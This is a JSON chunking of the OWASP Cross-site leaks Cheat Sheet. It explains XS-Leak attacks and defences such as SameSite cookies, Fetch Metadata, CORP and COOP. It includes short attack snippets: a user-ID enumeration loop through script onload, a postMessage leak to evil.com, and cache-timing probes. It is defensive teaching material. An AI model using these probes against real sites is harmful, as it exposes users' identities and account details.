@@ -1,0 +1,154 @@
+{
+ "doc": "XS_Leaks_Cheat_Sheet",
+ "title": "Cross-site leaks Cheat Sheet",
+ "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+ "chunks": [
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#001",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Introduction",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "This article describes examples of attacks and defenses against cross-site leaks vulnerability (XS Leaks). Since this vulnerability is based on the core mechanism of modern web browsers, it's also called a browser side-channel attack. XS-Leaks attacks seek to exploit the fact of seemingly insignificant information that is exchanged in cross-site communications between sites. This information infers answers to the previously asked questions about the victim's user account. Please take a look at the examples provided below:\n\nIs the user currently logged in?\n\nIs the user ID 1337?\n\nIs the user an administrator?\n\nDoes the user have a person with a particular email address in their contact list?\n\nOn the basis of such questions, the attacker might try to deduce the answers, depending on the application's context. In most cases, the answers will be in binary form (yes or no). The impact of this vulnerability depends strongly on the application's risk profile. Despite this, XS Leaks may pose a real threat to user privacy and anonymity."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#002",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attack vector",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "The entire attack takes place on the victim's browser side - just like an XSS attack\n\nIn some cases, the victim must remain on the attacker's site longer for the attack to succeed."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#003",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Same Origin Policy (SOP)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Before describing attacks, it's good to understand one of the most critical security mechanisms in browsers - The Same-origin Policy. A few key aspects:\n\nTwo URLs are considered as same-origin if their protocol, port, and host are the same\n\nAny origin can send a request to another source, but due to the Same-origin Policy, they will not be able to read the response directly\n\nSame Origin Policy may be relaxed by Cross Origin Resource Sharing (CORS).\n\nOrigin A\n\nOrigin B\n\nSame origin?\n\nhttps://example.com\n\nhttp://sub.example.com\n\nNo, different hosts\n\nhttps://example.com\n\nhttps://example.com:443\n\nYes! Implicit port in Origin A\n\nAlthough the SOP principle protects us from accessing information in cross-origin communication, XS-Leaks attacks based on residual data can infer some information."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#004",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "SameSite Cookies",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "The SameSite attribute of a cookie tells the browser whether it should include the cookie in the request from the other site. The SameSite attribute takes the following values:\n\nNone - the cookie will be attached to a request from another site, but it must be sent over a secure HTTPS channel\n\nLax - the cookie will be appended to the request from another page if the request method is GET and the request is made to top-level navigation (i.e. the navigation changes the address in the browser top bar)\n\nStrict - the cookie will never be sent from another site\n\nIt is worth mentioning here the attitude of Chromium based browsers in which cookies without SameSite attribute set by default are treated as Lax.\n\nSameSite cookies are a strong defense-in-depth mechanism against some classes of XS Leaks and CSRF attacks, which can significantly reduce the attack surface, but may not completely cut them (see, e.g., window-based XS Leak attacks like frame counting and navigation)."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#005",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "SameSite Cookies > How do we know that two sites are SameSite?",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "For SameSite cookies, a site consists of the scheme and the registrable domain (eTLD+1). The port is not part of the site. For example:\n\nFull URL\n\nSite (scheme + eTLD+1)\n\nhttps://example.com:443/data?query=test\n\nhttps://example.com\n\nWhy are we talking about eTLD+1 and not just TLD+1? It's because of domains like .github.io or .eu.org. Such parts are not atomic enough to be compared well. For this reason, a list of \"effective\" TLDs (eTLDs) was created and can be found here.\n\nSites with the same scheme and eTLD+1 are considered same-site. For example:\n\nOrigin A\n\nOrigin B\n\nSameSite?\n\nhttps://example.com\n\nhttp://example.com\n\nNo, different schemes\n\nhttps://evil.net\n\nhttps://example.com\n\nNo, different eTLD+1\n\nhttps://sub.example.com\n\nhttps://data.example.com\n\nYes, subdomains don't matter\n\nFor more information about SameSite, see the excellent article Understanding \"same-site\"."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#006",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks using the element ID attribute",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Elements in the DOM can have an ID attribute that is unique within the document. For example:\n\n```\n<button id=\"pro\">Pro account</button>\n```\n\nThe browser will automatically focus on an element with a given ID if we append a hash to the URL, e.g. https://example.com#pro. What's more, the JavaScript focus event gets fired. The attacker may try to embed the application in the iframe with specific source on its own controlled page:\n\nthen add listener in main document for blur event (the opposite of focus). When the victim visits the attackers site, the blur event gets fired. The attacker will be able to conclude that the victim has a pro account."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#007",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks using the element ID attribute > Defense > Framing protection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "If you don't need other origins to embed your application in a frame, you can consider using one of two mechanisms:\n\nContent Security Policy frame-ancestors directive. Read more about syntax.\n\nX-Frame-Options - mainly if you want to support old browsers.\n\nSetting up framing protection efficiently blocks the ability to embed your application in a frame on the attacker-controlled origin and protects from other attacks like Clickjacking."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#008",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks using the element ID attribute > Defense > Fetch metadata (Sec-Fetch-Dest)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Sec-Fetch-Dest header provides us with a piece of information about what is the end goal of the request. This header is included automatically by the browser and is one of the headers within the Fetch Metadata standard.\n\nWith Sec-Fetch-Dest you can build effective own resource isolation policies, for example:\n\n```\napp.get('/', (req, res) => {\n    if (req.get('Sec-Fetch-Dest') === 'iframe') {\n        return res.sendStatus(403);\n    }\n    res.send({\n        message: 'Hello!'\n    });\n});\n```\n\nIf you want to use headers from the Fetch Metadata standard, make sure that your users' browsers support this standard (you can check it here). Also, think about using the appropriate fallback in code if the Sec-Fetch-* header is not included in the request."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#009",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks based on error events",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Embedding from resources from other origins is generally allowed. For example, you can embed an image from another origin or even script on your page. What is not permitted is reading cross-origin resource due the SOP policy.\n\nWhen the browser sends a request for a resource, the server processes the request and decides on the response e.g. (200 OK or 404 NOT FOUND). The browser receives the HTTP response and based on that, the appropriate JavaScript event is fired (onload or onerror).\n\nIn this way, we can try to load resources and, based on the response status, infer whether they exist or not in the context of the logged-in victim. Let's look at the following situation:\n\nGET /api/user/1234 - 200 OK - currently logged-in user is 1234 because we successfully loaded resource (onload event fired)\n\nGET /api/user/1235 - 401 Unauthorized - 1235 is not the ID of the currently logged in user (onerror event will be triggered)\n\nGiven the above example, an attacker can use JavaScript on his controlled origin to guess the victim's ID by enumerating over all the values in a simple loop.\n\n```\nfunction checkId(id) {\n    const script = document.createElement('script');\n    script.src = `https://example.com/api/users/${id}`;\n    script.onload = () => {\n        console.log(`Logged user id: ${id}`);\n    };\n    document.body.appendChild(script);\n}\n\n// Generate array [0, 1, ..., 40]\nconst ids = Array(41)\n    .fill()\n    .map((_, i) => i + 0);\n\nfor (const id of ids) {\n    checkId(id);\n}\n```\n\nNote that the attacker here does not care about reading the response body even though it would not be able to due to solid isolation mechanisms in browsers such as Cross-Origin Resource Blocking. All it needs is the success information it receives when the onload event fires."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#010",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks based on error events > Defense > SubResource protection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "In some cases, mechanism of special unique tokens may be implemented to protect our sensitive endpoints.\n\n```\n/api/users/1234?token=be930b8cfb5011eb9a030242ac130003\n```\n\nToken should be long and unique\n\nThe back-end must correctly validate the token passed in the request\n\nAlthough it is pretty effective, the solution generates a significant overhead in proper implementation."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#011",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks based on error events > Defense > Fetch metadata (Sec-Fetch-Site)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "This header specifies where the request was sent from, and it takes the following values:\n\ncross-site\n\nsame-origin\n\nsame-site\n\nnone - user directly reached the page\n\nLike Sec-Fetch-Dest, this header is automatically appended by the browser to each request and is part of the Fetch Metadata standard. Example usage:\n\n```\napp.get('/api/users/:id', authorization, (req, res) => {\n    if (req.get('Sec-Fetch-Site') === 'cross-site') {\n        return res.sendStatus(403);\n    }\n\n    // ... more code\n\n    return res.send({ id: 1234, name: 'John', role: 'admin' });\n});\n```"
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#012",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks based on error events > Defense > Cross-Origin-Resource-Policy (CORP)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "If the server returns this header with the appropriate value, the browser will not load resources from our site or origin (even static images) in another application. Possible values:\n\nsame-site\n\nsame-origin\n\ncross-origin\n\nRead more about CORP here."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#013",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks on postMessage communication",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Sometimes in controlled situations we would like, despite SOP, to exchange information between different origins. We can use the postMessage mechanism. See below example:\n\n```\n// Origin: http://example.com\nconst site = new URLSearchParams(window.location.search).get('site'); // https://evil.com\nconst popup = window.open(site);\npopup.postMessage('secret message!', '*');\n\n// Origin: https://evil.com\nwindow.addEventListener('message', e => {\n    alert(e.data) // secret message! - leak\n});\n```"
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#014",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks on postMessage communication > Defense > Specify strict targetOrigin",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "To avoid situations like the one above, where an attacker manages to get the reference for a window to receive a message, always specify the exact targetOrigin in postMessage. Passing to the targetOrigin wildcard * causes any origin to receive the message.\n\n```\n// Origin: http://example.com\nconst site = new URLSearchParams(window.location.search).get('site'); // https://evil.com\nconst popup = window.open(site);\npopup.postMessage('secret message!', 'https://sub.example.com');\n\n// Origin: https://evil.com\nwindow.addEventListener('message', e => {\n    alert(e.data) // no data!\n});\n```"
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#015",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Frame counting attacks",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Information about the number of loaded frames in a window can be a source of leakage. Take for example an application that loads search results into a frame, if the results are empty then the frame does not appear.\n\nAn attacker can get information about the number of loaded frames in a window by counting the number of frames in a window.frames object.\n\nSo finally, an attacker can obtain the email list and, in a simple loop, open subsequent windows and count the number of frames. If the number of frames in the opened window is equal to 1, the email is in the client's database of the application used by the victim."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#016",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Frame counting attacks > Defense > Cross-Origin-Opener-Policy (COOP)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Setting this header will prevent cross-origin documents from opening in the same browsing context group. This solution ensures that document A opening another document will not have access to the window object. Possible values:\n\nunsafe-none\n\nsame-origin-allow-popups\n\nsame-origin\n\nIn case the server returns for example same-origin COOP header, the attack fails:\n\n```\nconst win = window.open('https://example.com/admin/customers?search=john%40example.com');\nconsole.log(win.frames.length) // Cannot read property 'length' of null\n```"
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#017",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks using browser cache",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "Browser cache helps to significantly reduce the time it takes for a page to load when revisited. However, it can also pose a risk of information leakage. If an attacker is able to detect whether a resource was loaded from the cache after the load time, he will be able to draw some conclusions based on it.\n\nThe principle is simple, a resource loaded from cache memory will load incomparably faster than from the server.\n\nAn attacker can embed a resource on their site that is only accessible to a user with the admin role. Then, using JavaScript, read the load time of a particular resource and, based on this information, deduce whether the resource is in cache or not.\n\nThe example selects the first matching resource timing entry already recorded in the timeline. Set THRESHOLD for the measurement context; a short duration alone does not prove a cache hit.\n\n```\n    // Illustrative timing threshold for this measurement context\n    // const THRESHOLD = ...\n\n    const adminImagePerfEntry = window.performance\n        .getEntriesByType('resource')\n        .find((entry) => entry.name.endsWith('admin.svg'));\n\n    if (adminImagePerfEntry && adminImagePerfEntry.duration < THRESHOLD) {\n        console.log('Possible cache hit (timing heuristic)');\n    }\n```"
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#018",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks using browser cache > Defense > Unpredictable tokens for images",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "This technique is accurate when the user wants the resources to still be cached, while an attacker will not be able to find out about it.\n\n```\n/avatars/admin.svg?token=be930b8cfb5011eb9a030242ac130003\n```\n\nTokens should be unique in context of each user\n\nIf an attacker cannot guess this token, it will not be able to detect whether the resource was loaded from cache"
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#019",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Attacks using browser cache > Defense > Using the Cache-Control header",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "You can disable the cache mechanism if you accept the degraded performance related to the necessity of reloading resources from the server every time a user visits the site. To disable caching for resources you want to protect, set the response header Cache-Control: no-store."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#020",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "Quick recommendations",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "If your application uses cookies, make sure to set the appropriate SameSite attribute.\n\nThink about whether you really want to allow your application to be embedded in frames. If not, consider using the mechanisms described in the framing protection section.\n\nTo strengthen the isolation of your application between other origins, use Cross Origin Resource Policy and Cross Origin Opener Policy headers with appropriate values.\n\nUse the headers available within Fetch Metadata to build your own resource isolation policy."
+  },
+  {
+   "chunk_id": "XS_Leaks_Cheat_Sheet#021",
+   "doc": "XS_Leaks_Cheat_Sheet",
+   "section": "References",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html",
+   "text": "MDN: Cross-Site Leaks\n\nW3C: Fetch Metadata Request Headers"
+  }
+ ]
+}
